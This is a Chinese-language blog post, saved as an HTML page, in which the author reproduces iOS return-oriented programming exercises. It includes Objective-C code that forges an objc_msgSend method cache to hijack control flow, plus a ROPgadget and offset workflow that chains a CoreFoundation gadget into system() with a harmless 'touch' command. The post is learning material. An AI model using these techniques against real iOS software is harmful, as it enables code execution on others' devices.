@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>iOS上的ROP利用 | Peterpan&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="由于之前没怎么接触过pwn，对于堆栈溢出更是一脸懵逼，所以只能部分的去复现了，三个实验参照iOS冰与火之歌第一章">
+<meta property="og:type" content="article">
+<meta property="og:title" content="iOS上的ROP利用">
+<meta property="og:url" content="http://yoursite.com/2018/05/13/iOS上的ROP利用/index.html">
+<meta property="og:site_name" content="Peterpan's Blog">
+<meta property="og:description" content="由于之前没怎么接触过pwn，对于堆栈溢出更是一脸懵逼，所以只能部分的去复现了，三个实验参照iOS冰与火之歌第一章">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%881.19.05.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%881.20.59.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%881.25.19.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%882.13.51.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%889.45.39.png">
+<meta property="og:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%889.19.41.png">
+<meta property="og:updated_time" content="2018-05-14T13:51:17.312Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="iOS上的ROP利用">
+<meta name="twitter:description" content="由于之前没怎么接触过pwn，对于堆栈溢出更是一脸懵逼，所以只能部分的去复现了，三个实验参照iOS冰与火之歌第一章">
+<meta name="twitter:image" content="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%881.19.05.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Peterpan&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/p1.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-03-22%20%E4%B8%8B%E5%8D%8811.42.23.png">
+    <h2 class="author">Peter pan</h2>
+    <h3 class="description">the mark of an educated mind is to be able to entertain a thought without accepting it</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>101</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>92</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>15</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-iOS上的ROP利用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/05/13/iOS上的ROP利用/" class="article-date">
+  <time class="post-time" datetime="2018-05-13T15:10:54.000Z" itemprop="datePublished">
+    <span class="post-month">5月</span><br/>
+    <span class="post-day">13</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      iOS上的ROP利用
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ROP/">ROP</a>
+  </div>
+
+          
+              
+  &nbsp; | &nbsp;
+  <div class="view-box">
+    <span id="/2018/05/13/iOS上的ROP利用/" class="leancloud_visitors" data-flag-title="iOS上的ROP利用">
+      &nbsp;阅读次数<span class="leancloud-visitors-count"></span>
+    </span>
+  </div>
+
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>由于之前没怎么接触过pwn，对于堆栈溢出更是一脸懵逼，所以只能部分的去复现了，三个实验参照<a href="https://bbs.pediy.com/thread-212714.htm" target="_blank" rel="external">iOS冰与火之歌第一章</a></p>
+<a id="more"></a>
+<h1 id="溢出攻击"><a href="#溢出攻击" class="headerlink" title="溢出攻击"></a>溢出攻击</h1><p>所谓的溢出攻击就是利用在计算机系统结构设计的时候没有将数据和代码做明确的区分的缺点，由于这个缺点目前不可能推翻重来，只能不断的去修补，所以我们的攻击的方式也在不停的迭代。</p>
+<p>对于这部分的讲解就直接参考wiki吧，<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic/" target="_blank" rel="external">链接</a></p>
+<p>这次我们用到的ROP则是因为DEP保护(NX)的开启之后导致我们去做<code>ret2shellcode</code>的时候会直接抛出异常，而不会去执行恶意的代码了。</p>
+<p>ROP其实就是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，比如我们通过覆盖<code>ret</code>指令将我们的程序去导向调用<code>shell</code>的代码，那么就意味着我们拿到了系统的<code>shell</code>权限了。在这里还是说一下<code>ret</code>指令的实质是将返回地址出栈，给<code>eip</code>，然后将esp的值加4.所以我们覆盖给eip的值就意味着我们操控了程序执行的流程了，还是很好理解的。</p>
+<p>其中一些简单的例子在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/basic_rop/" target="_blank" rel="external">wiki</a>中也有讲解，可以参考着练习。</p>
+<h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><p>首先在我们的电脑上编译一个arm架构的代码然后传到手机上，首先这一步我一开始就卡了好久，后来我给出两种解决的方式，一个是用theos的<code>tool</code>，然后<code>make package install</code>到手机上，成为一个命令，也就是在<code>/usr/bin</code>目录下，还有一个方法就是用clang去编译，命令行是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">clang -arch armv7s -g -v Talker.m hello.m -framework Foundation -o hello -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.2.sdk</div></pre></td></tr></table></figure>
+<p>然后通过<code>scp</code>传到手机上去调试，这个实验的探究是对于objc_msgSend的原理探究，之前的博客中说过，那么就不再细说，只是上述的方式在之后的实验中也会继续用到。</p>
+<h1 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h1><p>这个实验是为了修改PC指针，从而指向我们想让它执行的那个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"Talker.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach-o/dyld_images.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;objc/runtime.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> <span class="keyword">fake_structure_t</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">uint64_t</span> fake_objc_class_ptr;</div><div class="line">&#125;fake_structure;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> <span class="keyword">fake_objc_class_t</span> &#123;</div><div class="line">        <span class="keyword">char</span> pad[<span class="number">0x10</span>];</div><div class="line">        <span class="keyword">void</span>* cache_buckets_ptr;</div><div class="line">        <span class="keyword">uint32_t</span> cache_bucket_mask;</div><div class="line">&#125; fake_objc_class;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> <span class="keyword">fake_cache_bucket_t</span> &#123;</div><div class="line">        <span class="keyword">void</span>* cached_sel;</div><div class="line">        <span class="keyword">void</span>* cached_function;</div><div class="line">&#125; fake_cache_bucket;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    </div><div class="line">  Talker *talker = [[Talker alloc] init];</div><div class="line">  [talker say: @<span class="string">"Hello, Ice and Fire!"</span>];</div><div class="line">  [talker say: @<span class="string">"Hello, Ice and Fire!"</span>];</div><div class="line">  [talker release];</div><div class="line"></div><div class="line">  fake_cache_bucket.cached_sel = (<span class="keyword">void</span>*) NSSelectorFromString(@<span class="string">"release"</span>);</div><div class="line">  NSLog(@<span class="string">"cached_sel = %p"</span>, NSSelectorFromString(@<span class="string">"release"</span>));</div><div class="line"></div><div class="line">  fake_cache_bucket.cached_function = (<span class="keyword">void</span>*)<span class="number">0x12121212</span>;</div><div class="line">  NSLog(@<span class="string">"fake_cache_bucket.cached_function = %p"</span>, (<span class="keyword">void</span>*)fake_cache_bucket.cached_function);</div><div class="line">    </div><div class="line">  fake_objc_class.cache_buckets_ptr = &amp;fake_cache_bucket;</div><div class="line">  fake_objc_class.cache_bucket_mask=<span class="number">0</span>;</div><div class="line"></div><div class="line">  fake_structure.fake_objc_class_ptr=&amp;fake_objc_class;</div><div class="line">  talker= &amp;fake_structure;</div><div class="line"></div><div class="line">  [talker release];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这里我们在调用第二个<code>release</code>方法的时候就会找到那个假的<code>release</code>，然后根据找到那个假的缓存，然后返回给缓存值，然后函数执行的时候就会跳转到那个假的函数地址了，我们直接debug看看就知道了：</p>
+<p>首先到第二次调用<code>release</code>的地方下一个断点：</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%881.19.05.png" alt="实验二01"></p>
+<p>然后打印一下r12的寄存器的值看看，证明一下:</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%881.20.59.png" alt="实验二02"></p>
+<p>正好是我们修改的值，说明我的思想和实现都完全正确了，最后继续执行下去也会因为我们那里的内存不可读失败(内存保护)，所以我们需要利用到了ROP：</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%881.25.19.png" alt="实验二03"></p>
+<h1 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h1><p>这里我们的不是通过缓冲区溢出，而是构造合适的缓冲区数组来改变程序的控制流。</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%882.13.51.png" alt="实验三01"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">"Talker.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach-o/dyld_images.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;objc/runtime.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">struct</span> <span class="keyword">fake_receiver_t</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">uint32_t</span> fake_objc_class_ptr;</div><div class="line">    <span class="keyword">uint8_t</span> pad1[<span class="number">0x4</span><span class="number">-0x4</span>];</div><div class="line">    <span class="keyword">uint32_t</span> r0;             <span class="comment">//确保此处的值付给r0</span></div><div class="line">    <span class="keyword">uint8_t</span> pad2[<span class="number">0x8</span><span class="number">-0x4</span><span class="number">-0x4</span>];</div><div class="line">    <span class="keyword">uint32_t</span> r1;</div><div class="line">    <span class="keyword">char</span> cmd[<span class="number">1024</span>];</div><div class="line">&#125;fake_receiver;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> <span class="keyword">fake_objc_class_t</span> &#123;</div><div class="line">    <span class="keyword">char</span> pad[<span class="number">0x8</span>];</div><div class="line">    <span class="keyword">void</span>* cache_buckets_ptr;</div><div class="line">    <span class="keyword">uint32_t</span> cache_bucket_mask;</div><div class="line">&#125; fake_objc_class;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> <span class="keyword">fake_cache_bucket_t</span> &#123;</div><div class="line">    <span class="keyword">void</span>* cached_sel;</div><div class="line">    <span class="keyword">void</span>* cached_function;</div><div class="line">&#125; fake_cache_bucket;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span>* <span class="title">find_library_load_address</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* library_name)</span></span>&#123;</div><div class="line">    <span class="keyword">kern_return_t</span> err;</div><div class="line">    </div><div class="line">    <span class="keyword">task_dyld_info_data_t</span> task_dyld_info;</div><div class="line">    <span class="keyword">mach_msg_type_number_t</span> count = TASK_DYLD_INFO_COUNT;</div><div class="line">    err = task_info(mach_task_self(), TASK_DYLD_INFO, (<span class="keyword">task_info_t</span>)&amp;task_dyld_info, &amp;count);</div><div class="line">    </div><div class="line">    <span class="keyword">const</span> <span class="keyword">struct</span> dyld_all_image_infos* all_image_infos = (<span class="keyword">const</span> <span class="keyword">struct</span> dyld_all_image_infos*)task_dyld_info.all_image_info_addr;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">struct</span> dyld_image_info* image_infos = all_image_infos-&gt;infoArray;</div><div class="line">    </div><div class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; all_image_infos-&gt;infoArrayCount; i++)&#123;</div><div class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* image_name = image_infos[i].imageFilePath;</div><div class="line">        <span class="keyword">mach_vm_address_t</span> image_load_address = (<span class="keyword">mach_vm_address_t</span>)image_infos[i].imageLoadAddress;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(image_name, library_name))&#123;</div><div class="line">            <span class="keyword">return</span> (<span class="keyword">void</span>*)image_load_address;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    </div><div class="line">    Talker *talker = [[Talker alloc] init];</div><div class="line">    [talker say: @<span class="string">"Hello, Ice and Fire!"</span>];</div><div class="line">    [talker say: @<span class="string">"Hello, Ice and Fire!"</span>];</div><div class="line">    </div><div class="line">    [talker release];</div><div class="line"></div><div class="line">    fake_cache_bucket.cached_sel = (<span class="keyword">void</span>*) NSSelectorFromString(@<span class="string">"release"</span>);</div><div class="line">    NSLog(@<span class="string">"cached_sel = %p"</span>, NSSelectorFromString(@<span class="string">"release"</span>));</div><div class="line"></div><div class="line">    <span class="keyword">uint8_t</span>* CoreFoundation_base = find_library_load_address(<span class="string">"CoreFoundation"</span>);</div><div class="line">    NSLog(@<span class="string">"CoreFoundationbase address = %p"</span>, (<span class="keyword">void</span>*)CoreFoundation_base);</div><div class="line">    </div><div class="line">    <span class="comment">//0x21938d6c : vst1.32 &#123;d16, d17&#125;, [r0] ; ldr r1, [r0, #8] ; cmp r1, #0 ; itt ne ; ldrne r2, [r0, #0xc] ; cmpne r2, #0 ; beq #0x21938d98 ; ldr r0, [r0, #4] ; blx r1</span></div><div class="line">    <span class="comment">//thumb 汇编，需要+1</span></div><div class="line">  	<span class="comment">//0x21863000 文件初始偏移</span></div><div class="line">    fake_cache_bucket.cached_function = (<span class="keyword">void</span>*)CoreFoundation_base + <span class="number">0x21938d6c</span> - <span class="number">0x21863000</span>  + <span class="number">1</span>;</div><div class="line">    NSLog(@<span class="string">"fake_cache_bucket.cached_function = %p"</span>, (<span class="keyword">void</span>*)fake_cache_bucket.cached_function);</div><div class="line"></div><div class="line">    fake_receiver.r0=(<span class="keyword">uint64_t</span>)&amp;fake_receiver.cmd;</div><div class="line">    fake_receiver.r1=(<span class="keyword">void</span> *)dlsym(RTLD_DEFAULT, <span class="string">"system"</span>);</div><div class="line">    NSLog(@<span class="string">"system_address = %p"</span>, (<span class="keyword">void</span>*)fake_receiver.r1);</div><div class="line">    <span class="built_in">strcpy</span>(fake_receiver.cmd, <span class="string">"touch /tmp/IceAndFire"</span>);</div><div class="line">    </div><div class="line">    fake_objc_class.cache_buckets_ptr = &amp;fake_cache_bucket;</div><div class="line">    fake_objc_class.cache_bucket_mask=<span class="number">0</span>;</div><div class="line">    </div><div class="line">    fake_receiver.fake_objc_class_ptr=&amp;fake_objc_class;</div><div class="line">    talker= &amp;fake_receiver;</div><div class="line">    NSLog(@<span class="string">"fake_receiver address = %p"</span>, &amp;fake_receiver);</div><div class="line">    </div><div class="line">    [talker release];   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>首先要知道的是，在iOS上默认是开启ASLR+DEP+PIE的。ASLR和DEP很好理解，PIE的意思是program image本身在内存中的地址也是随机的。所以我们在iOS上使用ROP技术必须配合信息泄露的漏洞才行。虽然在iOS上写ROP非常困难，但有个好消息是虽然program image是随机的，但是每个进程都会加载的<code>dyld_shared_cache</code>这个共享缓存的地址在开机后是固定的，并且每个进程的<code>dyld_shared_cache</code>都是相同的。这个<code>dyld_shared_cache</code>有好几百M大，基本上可以满足我们对gadgets的需求。因此我们只要在自己的进程获取<code>dyld_shared_cache</code>的基址就能够计算出目标进程<code>gadgets</code>的位置。</p>
+<p>于是乎我通过<code>iFunbox</code>将两个架构的都拷了出来（不知道为什么我的ROPGadget不支持arm64，v5.4），然后通过<code>jtool</code>从cahe文件中提取CoreFoundation这个framework,生成dyld_shared_cache_armv7s.CoreFoundation。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">jtool -extract CoreFoundation ./dyld_shared_cache_armv7s</div></pre></td></tr></table></figure>
+<p>然后寻找可以利用的gadget:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary dyld_shared_cache_armv7s.CoreFoundation --thumb | grep &quot;ldr r0&quot;</div></pre></td></tr></table></figure>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%889.45.39.png" alt="实验三02"></p>
+<p>我找到了一个唯一有可能的gadget想要利用看看:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x21938d6c : vst1.32 &#123;d16, d17&#125;, [r0] ; ldr r1, [r0, #8] ; cmp r1, #0 ; itt ne ; ldrne r2, [r0, #0xc] ; cmpne r2, #0 ; beq #0x21938d98 ; ldr r0, [r0, #4] ; blx r1</div></pre></td></tr></table></figure>
+<p>然后找到对应的文件偏移：</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-05-14%20%E4%B8%8B%E5%8D%889.19.41.png" alt="实验三03"></p>
+<p>最后通过构造缓冲区数组使得最后跳转到system指令执行，但是不知道为什么还是段错误，可能还有什么细节没注意到吧，如果大神知道还请告知，感谢。</p>
+<p>可能稍微有点疑问的地方就是缓冲区数组的构造了，这里拿原文的做个例子吧：</p>
+<ol>
+<li>原文gadget:</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ldr x1, [x0, #0x98] ; ldr x0, [x0, #0x70] ; cbz x1, #0xdcf9c ; br x1</div></pre></td></tr></table></figure>
+<ol>
+<li>原文缓冲区数组</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> <span class="keyword">fake_receiver_t</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">uint64_t</span> fake_objc_class_ptr;</div><div class="line">    <span class="keyword">uint8_t</span> pad1[<span class="number">0x70</span><span class="number">-0x8</span>];</div><div class="line">    <span class="keyword">uint64_t</span> x0;</div><div class="line">    <span class="keyword">uint8_t</span> pad2[<span class="number">0x98</span><span class="number">-0x70</span><span class="number">-0x8</span>];</div><div class="line">    <span class="keyword">uint64_t</span> x1;</div><div class="line">    <span class="keyword">char</span> cmd[<span class="number">1024</span>];</div><div class="line">&#125;fake_receiver;</div></pre></td></tr></table></figure>
+<p>首先给x1赋值，为了让x1的值还是等于之前的值，所以要让<code>x0+0x98</code>就等于在内存中<code>x1</code>的值，所以之前的值加起来应该是十六进制<code>0x98</code>这么大，之后还有一个给<code>x0</code>赋值，也就是让<code>x0</code>之前的内存加起来为十六进制<code>0x70</code>，也就是意味：</p>
+<ol>
+<li>sizeof(pad1)+8=0x70</li>
+<li>sizeof(pad2+pad1)+8=0x98</li>
+</ol>
+<p>所以结构体中的填充数组大小由此得来。 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/05/13/iOS上的ROP利用/" data-id="cjh6b5gz7004pz4brr1mk6v3f" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/05/03/对于LL1文法的算法分析/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">对于LL1文法的算法分析</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Peterpan&#39;s Blog</h1>
+    <h2 class="blog-subtitle">Mind over muscle.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-03-22%20%E4%B8%8B%E5%8D%8811.42.23.png">
+    <h2 class="author">Peter pan</h2>
+    <h3 class="description">the mark of an educated mind is to be able to entertain a thought without accepting it</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>101</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>92</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>15</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/Peterpan0927" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://www.imbajin.com" target="_blank" title="Jin">
+          Jin
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://yinwang0.wordpress.com" target="_blank" title="Yinwang(English)">
+          Yinwang(English)
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://www.yinwang.org" target="_blank" title="Yinwang(Chinese)">
+          Yinwang(Chinese)
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://gloxec.github.io/" target="_blank" title="gloxec">
+          gloxec
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 Peter pan<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/about" title="" class="menuItem">音乐</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="https://github.com/Peterpan0927" title="" class="menuItem">Github</a>
+          
+            <a href="ftp://118.89.38.168" title="" class="menuItem">FTP</a>
+          
+        </div>
+        
+          <audio id="audio" src="plugin/galmenu/wulusai.mp3"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("Ljd6bJFL9N4tWj6WnGcbYUd2-gzGzoHsz", "xDGMWtxNt0aReJDVkuYmSqBd");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
